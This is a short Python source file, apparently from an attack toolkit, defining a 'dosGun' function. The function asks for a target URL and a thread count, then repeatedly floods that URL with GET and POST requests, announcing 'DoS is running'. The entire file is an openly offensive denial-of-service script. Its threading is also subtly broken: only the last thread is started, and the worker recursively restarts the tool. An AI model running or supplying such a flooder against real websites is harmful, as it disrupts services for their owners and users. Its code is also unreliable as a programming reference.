from threading import Thread
import keyboard
import libs


def dosGun():
    libs.iFace.menuHead()
    libs.iFace.entURL()
    print('After, press ESC to stop threads')
    print('')

    url = libs.URL.urlInput('')
    thrNum = input('>> Threads :')
    print('')

    def dos():
        while True:
            libs.URL.urlSet(url, 'get', '', libs.URL.headers(), '')
            libs.URL.urlSet(url, 'post', '', libs.URL.headers(), '')
            if keyboard.is_pressed('esc'):
                print('')
                print(">> Program stopped")
                break

        libs.iFace.keyBack()
        dosGun()

    for i in range(int(thrNum)):
        thr = Thread(target=dos)
        print(f'   Spam thread launched on the URL: {url}')

    thr.start()

    print('')
    print('>> DoS is running...')
